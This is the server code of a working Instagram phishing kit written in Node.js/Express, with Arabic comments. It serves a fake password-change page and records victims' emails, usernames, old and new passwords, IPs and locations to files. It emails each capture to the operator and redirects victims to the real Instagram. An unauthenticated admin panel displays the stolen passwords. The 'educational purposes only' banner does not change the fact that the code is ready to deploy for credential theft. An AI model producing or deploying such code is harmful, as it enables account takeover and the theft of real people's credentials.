require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const cookieParser = require('cookie-parser');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 8000; // ⬅️ البورت 8000 هنا


// إنشاء مجلد captured_data إذا ماكانش موجود
const capturedDataDir = path.join(__dirname, 'captured_data');
if (!fs.existsSync(capturedDataDir)) {
    console.log(`📁 Creating data directory: ${capturedDataDir}`);
    fs.mkdirSync(capturedDataDir, { recursive: true });
}

// تخزين الحملات
const phishingCampaigns = {};
app.use((req, res, next) => {
    console.log(`[${new Date().toLocaleTimeString()}] ${req.method} ${req.path} - IP: ${req.ip}`);
    next();
});
// Middleware
app.use(cors({
    origin:  "*",
    methods: ['GET', 'POST'],
    credentials: true
}));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

// Preflight requests
app.options('*', cors({
    origin: true,
    methods: ['GET', 'POST'],
    credentials: true,
    optionsSuccessStatus: 200
}));

// إعداد البريد الإلكتروني
let transporter;
try {
    const emailUser = process.env.EMAIL_USER || '';
    const emailPass = process.env.EMAIL_PASS || '';
    
    if (emailUser && emailPass && emailPass !== 'your_app_password_here') {
        console.log(`📧 Setting up email with: ${emailUser}`);
        
        transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 465,
            secure: true,
            auth: { user: emailUser, pass: emailPass },
            tls: { rejectUnauthorized: false }
        });

        transporter.verify((error, success) => {
            if (error) {
                console.log('❌ Email error:', error.message);
            } else {
                console.log('✅ Email service ready');
            }
        });
    } else {
        console.log('⚠️ Email disabled - using file storage');
    }
} catch (error) {
    console.log('❌ Email setup failed:', error.message);
}

// دالة لحفظ البيانات
function saveData(data) {
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `capture_${timestamp}.json`;
        const filepath = path.join(capturedDataDir, filename);
        
        fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
        console.log(`💾 Data saved: ${filename}`);
        
        // حفظ نسخة نصية
        const txtFile = path.join(capturedDataDir, `capture_${timestamp}.txt`);
        const txtContent = `
==========================================
INSTAGRAM SECURITY CAPTURE
==========================================
Time: ${new Date().toLocaleString()}
Email: ${data.email || 'N/A'}
Username: ${data.username || 'N/A'}
Old Password: ${data.oldPassword || 'N/A'}
NEW PASSWORD: ${data.newPassword || 'N/A'} ⭐
IP: ${data.ip || 'N/A'}
Browser: ${data.browser || 'N/A'}
Location: ${data.location || 'N/A'}
==========================================
        `.trim();
        
        fs.writeFileSync(txtFile, txtContent);
        return true;
    } catch (error) {
        console.log('❌ Save error:', error.message);
        return false;
    }
}

// المسارات
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
    const files = fs.existsSync(capturedDataDir) ? fs.readdirSync(capturedDataDir).filter(f => f.endsWith('.json')) : [];
    
    let html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Panel</title>
        <style>
            body { font-family: Arial, sans-serif; padding: 20px; background: #f5f5f5; }
            .container { max-width: 1200px; margin: 0 auto; }
            .header { background: linear-gradient(45deg, #405DE6, #5851DB, #833AB4); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }
            .stat-card { background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
            .data-table { background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); margin-top: 20px; }
            table { width: 100%; border-collapse: collapse; }
            th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }
            th { background: #f8f9fa; font-weight: bold; }
            .password { color: #dc3545; font-weight: bold; }
            .btn { display: inline-block; padding: 10px 20px; background: #28a745; color: white; text-decoration: none; border-radius: 5px; margin: 5px; }
            .btn-danger { background: #dc3545; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>📊 Instagram Security Admin</h1>
                <p>Server running on port ${PORT}</p>
            </div>
            
            <div class="stats">
                <div class="stat-card">
                    <h3>📈 Total Captures</h3>
                    <p style="font-size: 24px; font-weight: bold;">${files.length}</p>
                </div>
                <div class="stat-card">
                    <h3>🕒 Last Capture</h3>
                    <p>${files.length > 0 ? files[files.length-1].replace('capture_', '').replace('.json', '') : 'None'}</p>
                </div>
                <div class="stat-card">
                    <h3>🌐 Server Status</h3>
                    <p style="color: green; font-weight: bold;">✅ ONLINE</p>
                </div>
                <div class="stat-card">
                    <h3>📧 Email Status</h3>
                    <p>${transporter ? '✅ Ready' : '❌ Disabled'}</p>
                </div>
            </div>
            
            <div style="margin: 20px 0;">
                <a href="/" class="btn">🔗 Go to Phishing Page</a>
                <a href="javascript:location.reload()" class="btn">🔄 Refresh Data</a>
                <a href="/captured_data/" class="btn">📁 View Files</a>
            </div>
            
            <div class="data-table">
                <h2 style="padding: 15px; margin: 0;">Latest Captures</h2>
                <table>
                    <thead>
                        <tr>
                            <th>Time</th>
                            <th>Email</th>
                            <th>Username</th>
                            <th>Old Password</th>
                            <th>New Password</th>
                            <th>IP Address</th>
                        </tr>
                    </thead>
                    <tbody>
    `;
    
    // عرض آخر 10 سجلات
    const recentFiles = files.slice(-10).reverse();
    for (const file of recentFiles) {
        try {
            const filepath = path.join(capturedDataDir, file);
            const data = JSON.parse(fs.readFileSync(filepath, 'utf8'));
            
            html += `
            <tr>
                <td>${new Date(data.timestamp || file.replace('capture_', '').replace('.json', '').replace(/-/g, ':')).toLocaleString()}</td>
                <td>${data.email || 'N/A'}</td>
                <td>${data.username || 'N/A'}</td>
                <td>${data.oldPassword || 'N/A'}</td>
                <td class="password">${data.newPassword || 'N/A'}</td>
                <td>${data.ip || 'N/A'}</td>
            </tr>
            `;
        } catch (e) {
            continue;
        }
    }
    
    if (recentFiles.length === 0) {
        html += `<tr><td colspan="6" style="text-align: center; padding: 20px;">No data captured yet</td></tr>`;
    }
    
    html += `
                    </tbody>
                </table>
            </div>
            
            <div style="margin-top: 30px; padding: 15px; background: white; border-radius: 8px;">
                <h3>📋 Quick Actions</h3>
                <div>
                    <button onclick="testCapture()" class="btn">🧪 Test Capture</button>
                    <button onclick="clearData()" class="btn btn-danger">🗑️ Clear All Data</button>
                </div>
            </div>
        </div>
        
        <script>
            function testCapture() {
                fetch('/update-password', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        email: 'test@example.com',
                        username: 'testuser',
                        oldPassword: 'oldtest123',
                        newPassword: 'newtest456',
                        ip: '127.0.0.1',
                        browser: 'Test Browser'
                    })
                })
                .then(r => r.json())
                .then(() => {
                    alert('✅ Test data captured!');
                    location.reload();
                });
            }
            
            function clearData() {
                if (confirm('Delete ALL captured data?')) {
                    fetch('/admin/clear', { method: 'POST' })
                    .then(() => {
                        alert('✅ All data cleared!');
                        location.reload();
                    });
                }
            }
        </script>
    </body>
    </html>
    `;
    
    res.send(html);
});

// مسار لحذف البيانات
app.post('/admin/clear', (req, res) => {
    try {
        if (fs.existsSync(capturedDataDir)) {
            const files = fs.readdirSync(capturedDataDir);
            files.forEach(file => {
                fs.unlinkSync(path.join(capturedDataDir, file));
            });
        }
        res.json({ success: true, message: 'All data cleared' });
    } catch (error) {
        res.json({ success: false, message: error.message });
    }
});

// مسار ال capture
app.post('/update-password', (req, res) => {
    console.log('\n🎯 ===== NEW PASSWORD CAPTURE =====');
    
    const data = {
        timestamp: new Date().toISOString(),
        email: req.body.email || 'N/A',
        username: req.body.username || 'N/A',
        oldPassword: req.body.oldPassword || 'N/A',
        newPassword: req.body.newPassword || 'N/A',
        confirmPassword: req.body.confirmPassword || 'N/A',
        ip: req.ip || req.headers['x-forwarded-for'] || 'N/A',
        browser: req.headers['user-agent'] || 'N/A',
        location: req.body.location || 'N/A',
        campaignId: req.body.campaignId || 'direct'
    };
    
    // طباعة البيانات
    console.log('📧 Email:', data.email);
    console.log('👤 Username:', data.username);
    console.log('🔑 Old Password:', data.oldPassword);
    console.log('🔐 NEW PASSWORD:', data.newPassword);
    console.log('📍 IP:', data.ip);
    console.log('🌍 Location:', data.location);
    console.log('=================================\n');
    
    // حفظ البيانات
    saveData(data);
    
    // إرسال إيميل إذا كان البريد مضبوط
    if (transporter && process.env.EMAIL_TO) {
        const mailOptions = {
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_TO,
            subject: `🔐 Instagram Password Capture - ${data.email}`,
            html: `
                <div style="font-family: Arial, sans-serif; padding: 20px; background: #f8f9fa; border-radius: 10px;">
                    <h2 style="color: #dc3545;">🔐 NEW PASSWORD CAPTURED</h2>
                    <div style="background: white; padding: 20px; border-radius: 8px; margin: 15px 0;">
                        <p><strong>🎯 Target:</strong> ${data.email}</p>
                        <p><strong>👤 Username:</strong> ${data.username}</p>
                        <p><strong>🗝️ Old Password:</strong> ${data.oldPassword}</p>
                        <p style="background: #fff3cd; padding: 10px; border-radius: 5px; border-left: 4px solid #ffc107;">
                            <strong>🔐 NEW PASSWORD:</strong> <span style="color: #dc3545; font-weight: bold; font-size: 18px;">${data.newPassword}</span>
                        </p>
                        <p><strong>📍 IP Address:</strong> ${data.ip}</p>
                        <p><strong>🌍 Location:</strong> ${data.location}</p>
                        <p><strong>🕒 Time:</strong> ${new Date(data.timestamp).toLocaleString()}</p>
                    </div>
                    <p style="font-size: 12px; color: #666;">
                        This is an automated alert from the Instagram Security Simulation.
                    </p>
                </div>
            `
        };
        
        transporter.sendMail(mailOptions, (error) => {
            if (error) console.log('❌ Email send failed:', error.message);
            else console.log('📧 Email sent to admin');
        });
    }
    
    // الرد للعميل
    // نجمع كل البيانات
const responseData = {
    success: true,
    message: 'Password updated successfully',
    redirect: 'https://www.instagram.com/accounts/password/change/',
    data: data // نرجع البيانات المخزنة (اختياري)
};

// نخزن البيانات أولاً
const saved = saveData(data);

// نبعت الإيميل (إذا مضبوط)
if (transporter && process.env.EMAIL_TO) {
    // ... (كود الإيميل اللي موجود)
}

// نرسل الرد مع الـ redirect
res.json(responseData);
console.log('🎯 البيانات وصلت:', {
    email: data.email,
    oldPass: data.oldPassword,
    newPass: data.newPassword,
    ip: data.ip
});
});

// تشغيل الخادم
app.listen(PORT,'0.0.0.0', () => {
    console.log(`
    🚀 ============================================
    🚀 Instagram Phishing Simulation v3.0
    🚀 ============================================
    📍 Server: http://localhost:${PORT}
    📍 Admin: http://localhost:${PORT}/admin
    📧 Email: ${transporter ? '✅ Ready' : '❌ Disabled'}
    💾 Storage: captured_data/
    ⚠️  Educational purposes only!
    ============================================
    `);
});